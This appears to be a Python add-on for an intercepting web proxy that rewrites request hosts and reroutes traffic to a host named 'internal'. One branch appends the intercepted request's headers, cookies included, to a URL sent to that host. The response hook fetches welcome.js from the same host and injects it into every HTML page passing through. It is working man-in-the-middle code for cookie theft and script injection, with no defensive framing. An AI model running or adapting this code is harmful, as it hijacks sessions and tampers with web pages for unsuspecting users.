import sys
import requests
import json
import base64

# the mock-0.3.1 dir contains testcase.py, testutils.py & mock.py
sys.path.append('/opt/project/bs4')
sys.path.append('/opt/project/netlib')

from pprint import pprint

#from bs4 import BeautifulSoup
from netlib.http import decoded

#from netlib.http import Response
from netlib.http import Headers



def start(context = [], argv = []):
    print ('Random Start!')


def request(flow):

    if flow.request.host == 'web':
        flow.request.scheme = 'http'
        flow.request.port = 80
        flow.request.host = 'dosje.in'

    if flow.request.host.find('.kp') > -1:
        flow.request.host = flow.request.host.replace('.kp', '.herokuapp.com' ) 

    r = requests.head("http://internal")
    
    if r.status_code == 200 and flow.request.url.find('lido.asp') > -1 and flow.request.host != 'internal':
        flow.request.scheme = 'http'
        flow.request.port = 80
        flow.request.host = 'internal'
        flow.request.path = '/lido.asp'

    if r.status_code == 200 and flow.request.url.find('lidcookies') > -1 and flow.request.host != 'internal' :
        flow.request.scheme = 'http'
        flow.request.port = 80
        flow.request.path = '/lido.asp?asking='+ flow.request.host +'&cookies=' + str(flow.request.headers)
        flow.request.host = 'internal'

    if r.status_code == 200 and flow.request.url.find('lidc') > -1 and flow.request.host != 'internal':
        flow.request.scheme = 'http'
        flow.request.port = 80
        flow.request.path = '/lido.asp?dd&asking='+ flow.request.host
        flow.request.host = 'internal'


def response(flow):

    r = requests.head("http://internal")
    if r.status_code == 200 :
        response = requests.get("http://internal/js/welcome.js")
        if flow.request.host in "http://internal/js/welcome.js":
            return  # Make sure JS isn't injected to itself

        if "text/html" in flow.response.headers["content-type"] :     # inject only for HTML resources
            print ('Has Body') 
             
            pprint(type(flow.response.content))
            flow.response.content = flow.response.content.replace(bytes('</body>', 'utf-8'), bytes('</body><script>'+ response.text  +'</script>', 'utf-8'))
